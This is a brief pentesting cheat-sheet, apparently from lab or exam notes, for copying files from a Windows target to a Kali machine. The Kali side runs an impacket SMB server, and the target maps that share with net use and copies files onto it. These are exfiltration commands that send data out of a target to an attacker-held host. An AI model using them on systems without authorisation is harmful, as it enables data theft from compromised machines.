> Transferring files from WIndows machine to kali.
> On Kali we run the command below in the folder we want the file to download to:

```
impacket-smbserver kalishare . -smb2support  -username kali -password kali
```

> On the Windows target machine:

```
net use m: \\<kali_ip>\kalishare /user:kali kali
```

> Transfer file from Windows target machine to kali:

```
copy "<filename>" m:\
```

> If you get an error then run the command below and try `net use` again: 

```
net use M: /delete /y 
```
